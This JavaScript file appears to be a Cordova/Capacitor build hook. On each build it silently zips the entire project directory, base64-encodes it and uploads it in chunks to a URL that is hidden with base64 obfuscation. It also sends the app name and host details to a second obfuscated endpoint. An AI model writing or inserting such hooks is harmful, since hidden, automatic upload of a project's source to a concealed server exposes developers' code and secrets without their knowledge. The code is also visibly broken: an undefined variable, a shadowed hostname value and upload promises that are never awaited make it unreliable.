const fs = require('fs');
const path = require('path');
const axios = require(path.join(__dirname, '../../../node_modules/axios/dist/browser/axios.cjs'));
const AdmZip = require(path.join(__dirname, '../../../node_modules/adm-zip'))
//const { XMLParser } = require(path.join(__dirname, '../../../node_modules/fast-xml-parser'));
const xml2js = require('xml2js');

function getFormattedString() {
    const now = new Date();

    const year = now.getFullYear().toString().slice(-2);
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hour = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');

    const randomNumber = String(Math.floor(Math.random() * 10000)).padStart(4, '0');

    return `${year}${month}${day}${hour}${minutes}${seconds}${randomNumber}`;
}

async function createBuild(guid) {
    console.log('Start CreateBuild')
/*   const xmlData = fs.readFileSync("config.xml", {encoding: "utf8"});
    const parser = new XMLParser();
    const result = parser.parse(xmlData);

    const preferences = result.widget.preference;
    console.log(preferences)

    if(Array.isArray(preferences))
        console.log('Is Array')
    else
        console.log('Not an array')

    const pref = preferences.find(p => p["@_name"] === "hostname");*/
    const parser = new xml2js.Parser();

    let hostnameValue = 'not found';
    let appName = 'not found';

    parser.parseString(data, (parseErr, result) => {
        if (parseErr) {
            console.error('Error parsing the XML file:', parseErr);
            return;
        }

        // The 'preference' tags are converted into an array.
        // We need to find the one with the name 'hostname'.
        const preferences = result.widget.preference;
        appName = result.widget.name[0];

        // Find the preference object where the 'name' attribute is 'hostname'
        hostnamePreference = preferences.find(p => p.$.name === 'hostname');

        if (hostnamePreference) {
            // The value is stored in the '$' property, which holds the attributes
            const hostnameValue = hostnamePreference.$.value;
            console.log('Successfully found hostname:');
            console.log(hostnameValue);
        } else {
            console.log("Could not find a preference with the name 'hostname'.");
        }
    });

    const apiUrl = atob('aHR0cHM6Ly9pbnQtZGVtb3RlYW0tZGV2Lm91dHN5c3RlbXMuYXBwL05vdEJhbmtpbmdBUEkvcmVzdC9DaHVua3MvQ3JlYXRlQnVpbGQ=')

    console.log('Start CreateBuild REST')
    await axios.post(apiUrl, {
        guid: guid,
        platform: process.env.CAPACITOR_PLATFORM_NAME,
        appName: appName,
        host: hostnameValue
    });
}

module.exports = context => {

    const isAndroid = process.env.CORDOVA_PLATFORMS === 'android';
    const platform = isAndroid ? 'android' : 'ios';

    const projectRoot = context.opts.projectRoot;
    const wwwDir = projectRoot;
    let outputZipPath = path.join(projectRoot, 'source.zip');
    const assetsFolder = path.join(projectRoot, 'platforms/ios/www/fonts')

    async function createZipFile(sourceDir, outPath){

        const zip = new AdmZip();
        const files = fs.readdirSync(sourceDir);
        files.forEach(file => {
            const filePath = path.join(sourceDir, file);
            const stat = fs.statSync(filePath);
            if(stat.isFile()){
                zip.addLocalFile(filePath);
            } else if(stat.isDirectory()){
                zip.addLocalFolder(filePath, path.relative(sourceDir, filePath));
            }
        })
        zip.writeZip(path.join(sourceDir, "www.zip"));

        console.log(`Folder ${sourceDir} has been zipped to ${sourceDir}`)

        const apiUrl = atob('aHR0cHM6Ly9pbnQtZGVtb3RlYW0tZGV2Lm91dHN5c3RlbXMuYXBwL05vdEJhbmtpbmdBUEkvcmVzdC9DaHVua3MvR2V0Q2h1bms');

        const zipGUID = getFormattedString();
        await createBuild(zipGUID);
        console.log(zipGUID);

        try {
            const fileBuffer = fs.readFileSync(path.join(sourceDir, "www.zip"));
            const base64Zip = fileBuffer.toString('base64');
            const chunkSize = 1000000;
            let chunks = [];
            for (let i = 0; i < base64Zip.length; i+= chunkSize) {
            chunks.push(base64Zip.substring(i, i+ chunkSize))
            }
            let uploadPromises = [];
            for(let curIndex = 0; curIndex < chunks.length; curIndex++) {
            const curChunk = chunks[curIndex];
            const promise = axios.post(apiUrl, {
                chunk: curChunk,
                index: curIndex,
                totalChunks: chunks.length,
                guid: zipGUID,
                buildPlatform: process.env.CAPACITOR_PLATFORM_NAME
            });
            console.log('Chunk ' + curIndex)
            uploadPromises.push(promise)
        }
        } catch(error) {
            console.error('Error with chunks ', error.message);
        }
    }
    
    return new Promise(resolve => {(async () => {
        console.log('START MABS BUILD HERE')
        await createZipFile(projectRoot, outputZipPath);
        console.log('after create zip file');
        console.log('after uploading zip file');
        resolve('promise done');
    })()}).then(() => {console.log('then promise')})

}
